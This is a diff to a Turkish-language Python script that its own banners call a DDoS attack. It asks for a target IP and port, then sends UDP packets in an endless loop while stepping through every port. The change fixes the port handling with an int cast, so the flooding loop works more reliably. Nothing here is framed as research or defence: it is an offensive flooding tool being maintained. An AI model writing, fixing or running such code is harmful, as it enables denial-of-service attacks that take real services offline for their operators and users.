@@ -22,7 +22,7 @@ os.system("clear")
 os.system("figlet DDos Saldırısı")
 print 
 ip = input("IP Hedefi : ")
-port = input("Port : ")
+port = input("Port numarasını girin: ")
 
 os.system("clear")
 os.system("figlet Saldırı Başlatılıyor")
@@ -40,7 +40,7 @@ gönderilen = 0
 while True:
   soket.sendto(baytlar, (ip,port))
   gönderilen = gönderilen + 1
-  port = port + 1
+  port = int(port) + 1
   print("%s IP adresine ve %s nolu porta %s paket gönderildi.")%(ip,port,gönderilen)
   if port == 65534:
        port = 1
